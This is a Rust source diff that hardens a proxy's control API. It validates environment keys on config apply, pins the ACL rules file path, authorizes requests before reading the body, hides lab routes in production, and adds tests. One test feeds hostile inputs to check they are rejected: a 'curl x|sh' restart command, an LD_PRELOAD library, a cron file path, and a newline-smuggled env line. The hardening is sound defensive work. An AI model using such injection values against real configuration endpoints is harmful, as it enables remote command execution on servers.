@@ -29,8 +29,8 @@ use crate::pipeline::HttpEventPipeline;
 #[cfg(feature = "kafka")]
 use crate::pipeline::KafkaEventPipeline;
 use crate::runtime_config::{
-    apply_env_map, config_snapshot, read_env_file, schedule_service_restart, write_acl_rules_file,
-    write_env_file, ConfigApplyRequest, ConfigApplyResponse,
+    config_snapshot, read_env_file, schedule_service_restart, validate_console_env,
+    write_acl_rules_file, write_env_file, ConfigApplyRequest, ConfigApplyResponse,
 };
 use crate::sharded_cache::HttpL1Cache;
 use crate::tls::CertCache;
@@ -542,8 +542,21 @@ impl ControlApiState {
             );
         }
 
+        let production = crate::security_defaults::is_production_profile();
+        if let Err(problems) = validate_console_env(&request.env, production) {
+            warn!(target: "audit", rejected = %problems, "config apply rejected");
+            return json_response(
+                StatusCode::BAD_REQUEST,
+                &format!(r#"{{"error":"{}"}}"#, escape_json(&problems)),
+            );
+        }
+        let mut changed_keys: Vec<&str> = request.env.keys().map(String::as_str).collect();
+        changed_keys.sort_unstable();
+        // Audit: which keys changed, never their values (some are secrets).
+        info!(target: "audit", keys = ?changed_keys, acl_rules = request.acl_rules.is_some(), "config apply");
+
         let mut merged = read_env_file().unwrap_or_default();
-        for (key, value) in request.env {
+        for (key, value) in request.env.clone() {
             if value.is_empty() {
                 merged.remove(&key);
             } else {
@@ -561,15 +574,19 @@ impl ControlApiState {
             }
         };
 
-        apply_env_map(&merged);
+        // No std::env::set_var here: mutating the environment of a running
+        // multi-threaded process is unsound, and it would let the new values
+        // (e.g. a restart command) take effect without a restart. Settings
+        // apply on the restart below.
 
         let mut hot_reload = Vec::new();
 
         if let Some(rules) = &request.acl_rules {
-            let rules_path = merged
-                .get("ACL_RULES_PATH")
-                .cloned()
-                .or_else(|| std::env::var("ACL_RULES_PATH").ok())
+            // Only the path the service started with — never one from the
+            // request or the env file, which would be an arbitrary file write.
+            let rules_path = std::env::var("ACL_RULES_PATH")
+                .ok()
+                .filter(|p| !p.trim().is_empty())
                 .unwrap_or_else(|| "./acl-rules.json".to_string());
             if let Err(error) = write_acl_rules_file(&rules_path, rules) {
                 return json_response(
@@ -577,7 +594,6 @@ impl ControlApiState {
                     &format!(r#"{{"error":"{}"}}"#, escape_json(&error)),
                 );
             }
-            merged.insert("ACL_RULES_PATH".to_string(), rules_path);
             if let Some(acl_api) = &self.acl_api {
                 match acl_api.reload_from_disk() {
                     Ok(count) => {
@@ -611,7 +627,8 @@ impl ControlApiState {
         let message = if should_restart {
             "Configuration saved; proxy will restart shortly to apply all settings."
         } else {
-            "Configuration saved and hot-reloaded where supported."
+            "Configuration saved; ACL/upstream TLS/hierarchy files hot-reloaded, \
+             environment settings take effect on the next restart."
         };
 
         info!(
@@ -872,6 +889,66 @@ impl ControlApiState {
     }
 }
 
+/// Lab/experimental REST surfaces of the control plane (P1-07). In
+/// `DEPLOYMENT_PROFILE=production` they answer 404 unless explicitly enabled:
+/// `AGENT_API_ENABLED` (agent contract, devices), `AWG_API_ENABLED`
+/// (AmneziaWG), `LAB_API_ENABLED` (cluster, threat sync, CASB/DLP editing,
+/// eBPF, WASM). Other profiles keep them on.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub(crate) struct LabRoutes {
+    pub agent: bool,
+    pub awg: bool,
+    pub lab: bool,
+}
+
+impl LabRoutes {
+    #[cfg(test)]
+    pub(crate) fn all() -> Self {
+        Self {
+            agent: true,
+            awg: true,
+            lab: true,
+        }
+    }
+
+    fn from_env() -> Self {
+        let production = crate::security_defaults::is_production_profile();
+        let flag = |name: &str| {
+            std::env::var(name)
+                .map(|v| matches!(v.to_ascii_lowercase().as_str(), "1" | "true" | "yes" | "on"))
+                .unwrap_or(!production)
+        };
+        Self {
+            agent: flag("AGENT_API_ENABLED"),
+            awg: flag("AWG_API_ENABLED"),
+            lab: flag("LAB_API_ENABLED"),
+        }
+    }
+
+    pub(crate) fn allows(&self, path: &str) -> bool {
+        let agent = path.starts_with("/api/v1/agent/")
+            || path.starts_with("/api/agent/")
+            || path == "/api/v1/devices"
+            || path.starts_with("/api/v1/devices/");
+        if agent {
+            return self.agent;
+        }
+        if path.starts_with("/api/amneziawg/") {
+            return self.awg;
+        }
+        let lab = path.starts_with("/api/cluster/")
+            || path.starts_with("/api/threats/sync/")
+            || path == "/api/security/casb"
+            || path == "/api/security/dlp"
+            || path.starts_with("/api/ebpf/")
+            || path.starts_with("/api/wasm/");
+        if lab {
+            return self.lab;
+        }
+        true
+    }
+}
+
 #[derive(Clone)]
 pub struct ControlApiState {
     pub(crate) metrics: Arc<Metrics>,
@@ -902,6 +979,8 @@ pub struct ControlApiState {
     /// Bootstrap token for `POST /api/v1/agent/enroll` (`AGENT_ENROLL_TOKEN`).
     /// Falls back to control `api_token` when unset.
     enroll_token: Option<String>,
+    /// Which lab REST surfaces are live (P1-07).
+    pub(crate) lab_routes: LabRoutes,
     /// CA used to sign agent client certs from CSR (shared MITM CA by default).
     pub(crate) cert_cache: Option<CertCache>,
     shutdown_tx: Option<watch::Sender<bool>>,
@@ -970,6 +1049,7 @@ impl ControlApiState {
             agent_crl: AgentCrl::memory_only(),
             policy_hub,
             enroll_token: None,
+            lab_routes: LabRoutes::from_env(),
             cert_cache: None,
             shutdown_tx: None,
             acl_api: None,
@@ -1024,6 +1104,13 @@ impl ControlApiState {
 
     pub fn agent_crl_multi_node(&self) -> bool {
         self.agent_crl.is_multi_node()
+    }
+
+    /// Override which lab surfaces are live (tests).
+    #[cfg(test)]
+    pub(crate) fn with_lab_routes(mut self, lab_routes: LabRoutes) -> Self {
+        self.lab_routes = lab_routes;
+        self
     }
 
     pub fn with_config_apply(
@@ -1100,6 +1187,9 @@ impl ControlApiState {
     pub async fn handle_request(&self, mut req: Request<Incoming>) -> Response<Body> {
         // WebSocket policy push must upgrade before body is consumed.
         let path = req.uri().path();
+        if !self.lab_routes.allows(path) {
+            return json_response(StatusCode::NOT_FOUND, r#"{"error":"not found"}"#);
+        }
         if path == "/api/v1/agent/policy/ws"
             && req.method() == Method::GET
             && hyper_tungstenite::is_upgrade_request(&req)
@@ -1112,8 +1202,23 @@ impl ControlApiState {
 
         const MAX_CONTROL_API_BODY_BYTES: usize = 16 * 1024 * 1024; // 16 MB cap
 
+        // Authorize from the headers before buffering anything: otherwise any
+        // client could make the control port hold up to the cap per connection.
+        if !self.is_route_authorized(req.method(), req.uri().path(), req.headers()) {
+            return json_response(StatusCode::UNAUTHORIZED, r#"{"error":"unauthorized"}"#);
+        }
+
+        // Routes reachable without a token (OCSP, non-/api paths) never need a
+        // large body; cap them tightly so anonymous clients cannot pin 16 MiB each.
+        const MAX_UNAUTHENTICATED_BODY_BYTES: usize = 64 * 1024;
+        let body_limit = if self.is_route_public(req.method(), req.uri().path()) {
+            MAX_UNAUTHENTICATED_BODY_BYTES
+        } else {
+            MAX_CONTROL_API_BODY_BYTES
+        };
+
         let (parts, body) = req.into_parts();
-        let limited = http_body_util::Limited::new(body, MAX_CONTROL_API_BODY_BYTES);
+        let limited = http_body_util::Limited::new(body, body_limit);
         let body = match BodyExt::collect(limited).await {
             Ok(collected) => collected.to_bytes(),
             Err(e) => {
@@ -1150,6 +1255,45 @@ impl ControlApiState {
         self.dispatch_with_query(method, p, q, body, headers).await
     }
 
+    /// Token check for a control-plane route, decided from method, path and
+    /// headers only (so it can run before the body is read). Non-`/api/`
+    /// paths and the explicitly public endpoints pass.
+    fn is_route_authorized(&self, method: &Method, path: &str, headers: &HeaderMap) -> bool {
+        if self.is_route_public(method, path) {
+            return true;
+        }
+        let enroll_api = matches!(path, "/api/v1/agent/enroll" | "/api/agent/enroll");
+        let agent_api = path.starts_with("/api/v1/agent/")
+            || path.starts_with("/api/agent/")
+            || path == "/api/v1/devices"
+            || path.starts_with("/api/v1/devices/");
+        if enroll_api {
+            self.is_enroll_authorized(headers)
+        } else if agent_api {
+            self.is_agent_authorized(headers)
+        } else {
+            self.is_authorized(headers)
+        }
+    }
+
+    /// Routes served without any token: everything outside `/api/` plus the
+    /// explicitly public monitoring/OCSP endpoints.
+    fn is_route_public(&self, method: &Method, path: &str) -> bool {
+        if !path.starts_with("/api/") {
+            return true;
+        }
+        matches!(
+            (method, path),
+            (&Method::GET, "/api/stats")
+                | (&Method::GET, "/api/hierarchy/peers")
+                | (&Method::GET, "/api/upstream/tls")
+                // RFC 6960 OCSP is intentionally unauthenticated (status only).
+                | (&Method::POST, "/api/v1/agent/ocsp")
+                | (&Method::GET, "/api/v1/agent/ocsp")
+        ) || (*method == Method::OPTIONS
+            && (path.starts_with("/api/search") || path == "/api/events"))
+    }
+
     async fn dispatch_with_query(
         &self,
         method: &Method,
@@ -1158,38 +1302,20 @@ impl ControlApiState {
         body: Bytes,
         headers: &HeaderMap,
     ) -> Response<Body> {
-        // API endpoints authorization check
-        if path.starts_with("/api/") {
-            let public_api = matches!(
-                (method, path),
-                (&Method::GET, "/api/stats")
-                    | (&Method::GET, "/api/hierarchy/peers")
-                    | (&Method::GET, "/api/upstream/tls")
-                    // RFC 6960 OCSP is intentionally unauthenticated (status only).
-                    | (&Method::POST, "/api/v1/agent/ocsp")
-                    | (&Method::GET, "/api/v1/agent/ocsp")
-            ) || (*method == Method::OPTIONS
-                && (path.starts_with("/api/search") || path == "/api/events"));
-            if !public_api {
-                let enroll_api = matches!(path, "/api/v1/agent/enroll" | "/api/agent/enroll");
-                let agent_api = path.starts_with("/api/v1/agent/")
-                    || path.starts_with("/api/agent/")
-                    || path == "/api/v1/devices"
-                    || path.starts_with("/api/v1/devices/");
-                let authorized = if enroll_api {
-                    self.is_enroll_authorized(headers)
-                } else if agent_api {
-                    self.is_agent_authorized(headers)
-                } else {
-                    self.is_authorized(headers)
-                };
-                if !authorized {
-                    return json_response(StatusCode::UNAUTHORIZED, r#"{"error":"unauthorized"}"#);
-                }
-            }
+        // Lab surfaces are not live routes in production unless enabled.
+        if !self.lab_routes.allows(path) {
+            return json_response(StatusCode::NOT_FOUND, r#"{"error":"not found"}"#);
         }
 
-        if let Some(resp) = self.dispatch_agent(method, path, query, body.clone()).await {
+        // API endpoints authorization check
+        if !self.is_route_authorized(method, path, headers) {
+            return json_response(StatusCode::UNAUTHORIZED, r#"{"error":"unauthorized"}"#);
+        }
+
+        if let Some(resp) = self
+            .dispatch_agent(method, path, query, body.clone(), headers)
+            .await
+        {
             return resp;
         }
 
@@ -1363,14 +1489,14 @@ impl ControlApiState {
         }
     }
 
-    fn extract_bearer<'a>(&self, headers: &'a HeaderMap) -> Option<&'a str> {
+    pub(crate) fn extract_bearer<'a>(&self, headers: &'a HeaderMap) -> Option<&'a str> {
         headers
             .get(AUTHORIZATION)
             .and_then(|v| v.to_str().ok())
             .and_then(|v| v.strip_prefix("Bearer "))
     }
 
-    fn is_authorized(&self, headers: &HeaderMap) -> bool {
+    pub(crate) fn is_authorized(&self, headers: &HeaderMap) -> bool {
         self.is_authorized_bearer(self.extract_bearer(headers))
     }
 
@@ -1953,6 +2079,7 @@ mod tests {
             crate::session_store::GlobalSessionStore::new(None),
             crate::threat_sync::ThreatSyncEngine::new("test-node".to_string(), None),
         )
+        .with_lab_routes(LabRoutes::all())
     }
 
     /// #271: production fail-closed denies mutations when no token is configured.
@@ -2010,6 +2137,23 @@ mod tests {
             .dispatch(&Method::GET, "/api/stats", Bytes::new(), &HeaderMap::new())
             .await;
         assert_eq!(stats.status(), StatusCode::OK);
+    }
+
+    /// AS-06: the pre-body gate in `handle_request` uses the same decision as
+    /// dispatch, so unauthenticated bodies are never buffered.
+    #[test]
+    fn route_authorization_is_decided_from_headers_alone() {
+        let metrics = Arc::new(Metrics::new().unwrap());
+        let cache = Arc::new(HttpL1Cache::new(100, 4));
+        let mut state = state_plain(metrics, cache);
+        state.fail_closed = true;
+        let none = HeaderMap::new();
+        assert!(!state.is_route_authorized(&Method::POST, "/api/config/apply", &none));
+        assert!(!state.is_route_authorized(&Method::POST, "/api/cache/purge", &none));
+        assert!(!state.is_route_authorized(&Method::POST, "/api/v1/devices/x/revoke", &none));
+        assert!(state.is_route_authorized(&Method::GET, "/api/stats", &none));
+        assert!(state.is_route_authorized(&Method::POST, "/api/v1/agent/ocsp", &none));
+        assert!(state.is_route_authorized(&Method::GET, "/health", &none));
     }
 
     #[tokio::test]
@@ -2652,7 +2796,7 @@ mod tests {
         let state = state_plain(metrics, cache).with_config_apply(shutdown_tx, None);
 
         let payload = Bytes::from(
-            r#"{"env":{"HTTP_PORT":"3128","METRICS_PORT":"9090","RKN_SYNC_URL":"https://svn.code.sf.net/p/zapret-info/code/dump.csv"},"restart":true}"#,
+            r#"{"env":{"HTTP_PORT":"3128","METRICS_PORT":"9090","CACHE_TTL_SECONDS":"120"},"restart":true}"#,
         );
         let resp = state
             .dispatch(
@@ -2670,7 +2814,7 @@ mod tests {
 
         let written = std::fs::read_to_string(&env_path).unwrap();
         assert!(written.contains("HTTP_PORT=3128"));
-        assert!(written.contains("RKN_SYNC_URL="));
+        assert!(written.contains("CACHE_TTL_SECONDS=120"));
 
         tokio::time::timeout(std::time::Duration::from_secs(2), shutdown_rx.changed())
             .await
@@ -2679,6 +2823,43 @@ mod tests {
         assert!(*shutdown_rx.borrow());
 
         std::env::remove_var("CONFIG_RESTART_CMD");
+        std::env::remove_var("CONFIG_ENV_PATH");
+    }
+
+    /// P0-5: forbidden keys and newline injection are rejected before the env
+    /// file is touched, and no restart is scheduled.
+    #[tokio::test]
+    async fn config_apply_rejects_forbidden_keys_and_newlines() {
+        let _guard = CONFIG_ENV_MUTEX.lock().await;
+        let temp = tempfile::tempdir().unwrap();
+        let env_path = temp.path().join("bsdm-proxy.env");
+        std::env::set_var("CONFIG_ENV_PATH", env_path.to_string_lossy().to_string());
+
+        let metrics = Arc::new(Metrics::new().unwrap());
+        let cache = Arc::new(HttpL1Cache::new(100, 4));
+        let (shutdown_tx, shutdown_rx) = watch::channel(false);
+        let state = state_plain(metrics, cache).with_config_apply(shutdown_tx, None);
+
+        for payload in [
+            r#"{"env":{"CONFIG_RESTART_CMD":"curl x|sh"}}"#,
+            r#"{"env":{"HTTP_PORT":"3128","LD_PRELOAD":"/tmp/x.so"}}"#,
+            r#"{"env":{"ACL_RULES_PATH":"/etc/cron.d/x"}}"#,
+            r#"{"env":{"RUST_LOG":"info\nCONFIG_RESTART_CMD=id"}}"#,
+        ] {
+            let resp = state
+                .dispatch(
+                    &Method::POST,
+                    "/api/config/apply",
+                    Bytes::from(payload),
+                    &HeaderMap::new(),
+                )
+                .await;
+            assert_eq!(resp.status(), StatusCode::BAD_REQUEST, "{payload}");
+        }
+        assert!(!env_path.exists(), "env file must not be written");
+        assert!(!*shutdown_rx.borrow());
+        assert!(std::env::var("LD_PRELOAD").is_err());
+
         std::env::remove_var("CONFIG_ENV_PATH");
     }
 
@@ -2900,6 +3081,157 @@ mod tests {
         let t_json: serde_json::Value = serde_json::from_slice(&t_body).unwrap();
         assert_eq!(t_json["device_id"], device_id);
         assert_eq!(t_json["assigned_ip"], "10.8.0.2");
+    }
+
+    /// P1-07: lab surfaces answer 404 when disabled; GA routes are unaffected.
+    #[tokio::test]
+    async fn lab_routes_are_hidden_when_disabled() {
+        let state = state_plain(
+            Arc::new(Metrics::new().unwrap()),
+            Arc::new(HttpL1Cache::new(100, 4)),
+        )
+        .with_lab_routes(LabRoutes {
+            agent: false,
+            awg: false,
+            lab: false,
+        });
+        for (m, p) in [
+            (Method::GET, "/api/v1/devices"),
+            (Method::POST, "/api/v1/agent/enroll"),
+            (Method::GET, "/api/amneziawg/status"),
+            (Method::GET, "/api/cluster/session-state"),
+            (Method::POST, "/api/threats/sync/broadcast"),
+            (Method::POST, "/api/security/dlp"),
+            (Method::GET, "/api/ebpf/stats"),
+        ] {
+            let resp = state.dispatch(&m, p, Bytes::new(), &HeaderMap::new()).await;
+            assert_eq!(resp.status(), StatusCode::NOT_FOUND, "{m} {p}");
+        }
+        let stats = state
+            .dispatch(&Method::GET, "/api/stats", Bytes::new(), &HeaderMap::new())
+            .await;
+        assert_eq!(stats.status(), StatusCode::OK);
+        let only_agent = LabRoutes {
+            agent: true,
+            awg: false,
+            lab: false,
+        };
+        assert!(only_agent.allows("/api/v1/agent/heartbeat"));
+        assert!(!only_agent.allows("/api/amneziawg/peers"));
+        assert!(only_agent.allows("/api/config/apply"));
+    }
+
+    /// AS-05 / AS-05b: a device token reaches only its own device.
+    #[tokio::test]
+    async fn device_token_is_scoped_to_its_own_device() {
+        let mut state = state_plain(
+            Arc::new(Metrics::new().unwrap()),
+            Arc::new(HttpL1Cache::new(100, 4)),
+        );
+        state.api_token = Some("ctl-token".to_string());
+        state.enroll_token = Some("enroll-token".to_string());
+        let state = state;
+        let bearer = |t: &str| {
+            let mut h = HeaderMap::new();
+            h.insert(AUTHORIZATION, format!("Bearer {t}").parse().unwrap());
+            h
+        };
+        let enroll = |id: &str| {
+            Bytes::from(
+                serde_json::json!({"device_id": id, "platform": "linux", "capabilities": ["tunnel"]})
+                    .to_string(),
+            )
+        };
+
+        let mut tokens = Vec::new();
+        for id in ["dev-a", "dev-b"] {
+            let resp = state
+                .dispatch(
+                    &Method::POST,
+                    "/api/v1/agent/enroll",
+                    enroll(id),
+                    &bearer("enroll-token"),
+                )
+                .await;
+            assert_eq!(resp.status(), StatusCode::OK);
+            let body = BodyExt::collect(resp.into_body()).await.unwrap().to_bytes();
+            let v: serde_json::Value = serde_json::from_slice(&body).unwrap();
+            tokens.push(v["device_token"].as_str().unwrap().to_string());
+        }
+        let a = bearer(&tokens[0]);
+
+        // Fleet-wide operations are operator-only.
+        for (m, p) in [
+            (Method::GET, "/api/v1/devices"),
+            (Method::POST, "/api/v1/devices/dev-b/revoke"),
+            (Method::POST, "/api/v1/agent/policy/push"),
+            (Method::GET, "/api/v1/agent/events/recent"),
+        ] {
+            let resp = state.dispatch(&m, p, Bytes::from_static(b"{}"), &a).await;
+            assert_eq!(resp.status(), StatusCode::FORBIDDEN, "{m} {p}");
+        }
+        // Foreign tunnel config / heartbeat: refused. Own: allowed.
+        let resp = state
+            .dispatch(
+                &Method::GET,
+                "/api/v1/agent/tunnel/config?device_id=dev-b",
+                Bytes::new(),
+                &a,
+            )
+            .await;
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        let resp = state
+            .dispatch(
+                &Method::GET,
+                "/api/v1/agent/tunnel/config",
+                Bytes::new(),
+                &a,
+            )
+            .await;
+        assert_eq!(resp.status(), StatusCode::OK);
+        let body = BodyExt::collect(resp.into_body()).await.unwrap().to_bytes();
+        let v: serde_json::Value = serde_json::from_slice(&body).unwrap();
+        assert_eq!(v["device_id"], "dev-a");
+        let hb = |id: &str| {
+            Bytes::from(format!(
+                r#"{{"device_id":"{id}","status":"healthy","trust_score":1}}"#
+            ))
+        };
+        let resp = state
+            .dispatch(&Method::POST, "/api/v1/agent/heartbeat", hb("dev-b"), &a)
+            .await;
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        // Whitespace variants of the own id must not mint new registry records.
+        let resp = state
+            .dispatch(&Method::POST, "/api/v1/agent/heartbeat", hb("dev-a "), &a)
+            .await;
+        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
+        let resp = state
+            .dispatch(&Method::POST, "/api/v1/agent/heartbeat", hb("dev-a"), &a)
+            .await;
+        assert_eq!(resp.status(), StatusCode::OK);
+
+        // Re-enrolling an existing id with the shared enroll token: conflict.
+        let resp = state
+            .dispatch(
+                &Method::POST,
+                "/api/v1/agent/enroll",
+                enroll("dev-b"),
+                &bearer("enroll-token"),
+            )
+            .await;
+        assert_eq!(resp.status(), StatusCode::CONFLICT);
+
+        // The operator keeps full control.
+        let resp = state
+            .dispatch(
+                &Method::POST,
+                "/api/v1/devices/dev-b/revoke",
+                Bytes::new(),
+                &bearer("ctl-token"),
+            )
+            .await;
+        assert_eq!(resp.status(), StatusCode::OK);
     }
 
     #[tokio::test]
